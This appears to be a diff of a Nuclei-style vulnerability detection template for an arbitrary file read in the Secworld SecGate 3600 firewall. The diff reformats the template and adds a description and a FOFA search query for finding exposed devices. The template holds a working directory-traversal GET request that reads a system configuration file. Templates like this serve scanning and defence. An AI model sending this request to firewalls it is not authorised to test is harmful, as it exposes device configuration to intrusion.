@@ -1,28 +1,30 @@
-# 来源: afrog（转换自 afrog/xray 表达式 POC）
+id: secworld-secgate3600-obj-area-export-save-fileread
+
+info:
+  name: 网神 SecGate 3600 obj_area_export_save 任意文件读取
+  author: Observer
+  severity: high
+  description: |
+    网神 SecGate 3600 防火墙 sys_export_conf_local_save 接口 file_name 参数存在目录穿越，可读取系统配置文件。
+  metadata:
+    max-request: 1
+    fofa-query: title="secgate 3600"
+  tags: secgate,secworld,fileread,lfi
+
 http:
-  - matchers:
-      - type: status
-        status:
-          - 200
+  - method: GET
+    path:
+      - '{{BaseURL}}/?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds'
+
+    matchers-condition: and
+    matchers:
       - type: word
         part: header
         words:
-          - application/octet-stream
-          - modules/system/import_export.mds
+          - 'application/octet-stream'
+          - 'modules/system/import_export.mds'
         condition: and
-    method: GET
-    path:
-      - '{{BaseURL}}/?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds'
-id: secworld-secgate3600-obj-area-export-save-fileread
-info:
-  author: Observer
-  description: |
-    FOFA: fid="1Lh1LHi6yfkhiO83I59AYg=="
-  metadata:
-    argus-execution-class: detection
-    argus-import-license: MIT License
-    argus-import-source: afrog
-    argus-risk-level: high
-  name: 网神SecGate 3600 防火墙 obj_area_export_save 任意文件读取
-  severity: high
-  tags: secworld,fileread,argus-import
+
+      - type: status
+        status:
+          - 200
